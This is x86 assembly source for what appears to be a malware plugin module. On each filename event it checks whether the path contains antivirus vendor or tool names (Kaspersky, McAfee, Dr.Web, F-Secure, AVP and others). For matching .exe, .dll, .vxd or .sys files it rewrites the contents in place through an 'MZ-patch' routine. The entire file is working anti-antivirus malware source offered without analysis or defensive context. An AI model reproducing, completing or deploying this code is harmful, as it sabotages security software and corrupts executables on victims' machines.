
MAXBUFSIZE              equ     65536

include                 AAVFILE.INC
include                 ..\..\INCLUDE\consts.inc
include                 ..\EXTMAN\EXTMAN.INC

                        extrn   Event:PROC
                        public  HandleEvent
                        public  unload

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

bufptr                  dd      0
bufsize                 dd      ?

                        .code

HandleEvent:
                        mov     eax, [esp+4]    ; event_id

                        cmp     eax, EV_EXTMAN_GOT_FILENAME
                        je      __aavfile

__return_0:             xor     eax, eax
                        retn

__aavfile:              mov     ecx, [esp+8]
                        cmp     [ecx].ei_is_alredy, 1
                        je      __return_0
                        mov     edx, [ecx].ei_fnameptr
                        call    isbadname
                        jnc     __return_0

                        mov     eax, [ecx].ei_ext
                        or      eax, 202020h
                        neg     eax

                        cmp     eax, -'exe'
                        je      __patch_file
                        cmp     eax, -'lld'
                        je      __patch_file
                        cmp     eax, -'dxv'
                        je      __patch_file
                        cmp     eax, -'sys'
                        je      __patch_file

__return_1:             mov     eax, 1
                        retn

__patch_file:
                        call    patchfile
                        or      eax, eax
                        jz      __return_1

                        push    0
                        push    EV_AAVFILE_PATCHED
                        call    Event
                        add     esp, 8

                        jmp     __return_1

; input:  EDX=filename (may contain paths, etc.)
; output: CF==1  -- really bad name
;         CF==0  -- normal name

isbadname:              pusha

__cycle:                mov     eax, [edx]
                        inc     edx

                        or      al, al
                        jz      __exit_normal

                        or      eax, 20202020h
                        neg     eax

                        cmp     eax, -'itna'    ; anti
                        je      __bad
                        cmp     eax, -'sdia'    ; aids
                        je      __bad
                        cmp     eax, -'uriv'    ; viru
                        je      __bad
                        cmp     eax, -'ewrd'    ; drwe
                        je      __bad
                        cmp     eax, -'facm'    ; mcaf
                        je      __bad
                        cmp     eax, -'nida'    ; adin
                        je      __bad
                        cmp     eax, -'psak'    ; kasp
                        jz      __bad
                        cmp     eax, -'ipva'    ; avpi
                        jz      __bad
                        cmp     eax, -'es-f'    ; f-secure
                        jz      __bad
                        cmp     eax, -'facm'    ; mcafee
                        jz      __bad

                        sal     eax, 8
                        sar     eax, 8

                        cmp     eax, -'pva'     ; avp
                        je      __bad
                        cmp     eax, -'vak'     ; kav
                        je      __bad

                        jmp     __cycle

__exit_normal:          popa
                        clc
                        retn

__bad:                  popa
                        stc
                        retn

; input:  EDX=filename
; output: EAX=1 -- patched
;         EAX=0 -- ok

patchfile:              xor     eax, eax
                        pusha

                        push    edx             ; fname
                        callW   fopen_rw
                        or      eax, eax
                        jz      __exit
                        xchg    ebx, eax        ; handle

                        cmp     bufptr, 0
                        jne     __alloc_done

                        push    MAXBUFSIZE
                        callW   malloc
                        mov     bufptr, eax
__alloc_done:

                        xor     esi, esi        ; pos

__cycle:                push    esi             ; pos
                        push    MAXBUFSIZE      ; size
                        push    bufptr          ; buf
                        push    ebx             ; handle
                        callW   fread
                        mov     bufsize, eax

                        cmp     eax, 512
                        jb      __close

                        push    1       ; use MZ-patch
                        push    bufsize ; size
                        push    bufptr  ; buf
                        callW   patch_buf
                        add     esp, 12

                        or      eax, eax        ; no bytes changed?
                        jz      __next

                        int 3

                        add     [esp].popa_eax, eax     ; result

                        push    esi             ; pos
                        push    bufsize         ; size
                        push    bufptr          ; buf
                        push    ebx             ; handle
                        callW   fwrite

__next:                 add     esi, MAXBUFSIZE ; next block
                        jmp     __cycle

__close:                push    ebx
                        callW   fclose

__exit:                 popa
                        retn

unload:                 push    bufptr
                        callW   mfree

                        xor     eax, eax
                        retn

                        end

